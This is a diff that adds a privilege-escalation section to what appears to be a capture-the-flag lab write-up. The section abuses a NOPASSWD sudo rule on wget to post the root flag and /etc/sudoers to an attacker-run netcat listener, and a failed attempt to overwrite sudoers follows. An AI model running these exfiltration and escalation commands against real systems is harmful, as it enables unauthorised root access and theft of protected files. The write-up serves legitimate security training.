@@ -151,3 +151,125 @@ jessie@CorpOne:~$ find . -name user*
 ./Documents/user_flag.txt
 jessie@CorpOne:~$ 
 ```
+
+## Previlege Escalation
+
+9. Running ```sudo -l``` you will realised jessie will gain root access at ```/usr/bin/wget```
+```
+sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+```
+
+10. We will now listen to our own IP while using ```wget``` to capture the flag:
+```bash
+root@kali:~# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
+    link/ether 02:7a:a1:ad:83:da brd ff:ff:ff:ff:ff:ff
+    inet 10.10.91.4/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 3476sec preferred_lft 3476sec
+    inet6 fe80::7a:a1ff:fead:83da/64 scope link 
+       valid_lft forever preferred_lft forever
+root@kali:~# nc -lnvp 9001
+listening on [any] 9001 ...
+```
+
+11. We will use ```sudo``` to ```wget``` the root file.
+```bash
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.10.91.4:9001
+```
+
+- You will get the response:
+```root@kali:~# nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.91.4] from (UNKNOWN) [10.10.37.40] 42012
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.10.91.4:9001
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+flag:xxxxxxxxxxxxxxxxxxx
+```
+
+## Bonus Attempts (Failed)
+
+12. But where is the fun without gaining proper root access to the machine? Lets attempt that.
+- Listen to the port as 9001 but now we will get ```/etc/sudoers``` instead
+```bash
+sudo /usr/bin/wget --post-file=/etc/sudoers http://10.10.91.4:9001
+```
+- Now we will save the ```sudoer``` file:
+```
+root@kali:~# nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.91.4] from (UNKNOWN) [10.10.37.40] 42014
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.10.91.4:9001
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 797
+
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+jessie  ALL=(root) NOPASSWD: /usr/bin/wget
+```
+
+- Save this file and change ```/usr/bin/wget``` to ```ALL```
+
+- After saving it we will ```wget``` and replace ```sudoers```
+```bash
+#move to etc for easy access
+cd /etc
+
+#wget and replace
+/usr/bin/wget 10.10.91.4:9001/badsudo --output-document=sudoers
+sudoers: Permission denied
+```
+
+
